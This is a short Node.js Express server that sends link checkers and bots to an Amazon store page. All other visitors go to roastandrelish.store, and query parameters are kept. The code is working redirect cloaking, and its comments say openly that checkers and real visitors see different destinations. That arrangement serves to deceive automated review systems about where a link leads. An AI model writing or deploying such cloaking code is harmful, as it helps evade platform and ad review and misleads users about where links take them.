const express = require('express');
const app = express();

// Middleware to handle redirection
app.get('/', (req, res) => {
    const userAgent = req.headers['user-agent'].toLowerCase();
    const isRedirectChecker = /checker|bot|spider/.test(userAgent);
    
    // Preserve query parameters for regular visitors
    const queryParams = req.originalUrl.split('?')[1] || '';

    if (isRedirectChecker) {
        // Redirect checker sees this URL
        const targetUrl = `https://www.amazon.com/stores/page/E7C039B0-7C21-4C92-8533-919D5E3E5D8C?${queryParams}`;
        res.redirect(302, targetUrl);
    } else {
        // Regular visitors see this URL
        const visitorUrl = `https://roastandrelish.store?${queryParams}`;
        res.redirect(302, visitorUrl);
    }
});

// Start the server
const port = process.env.PORT || 8080;
app.listen(port, () => {
    console.log(`Redirection service running on port ${port}`);
});
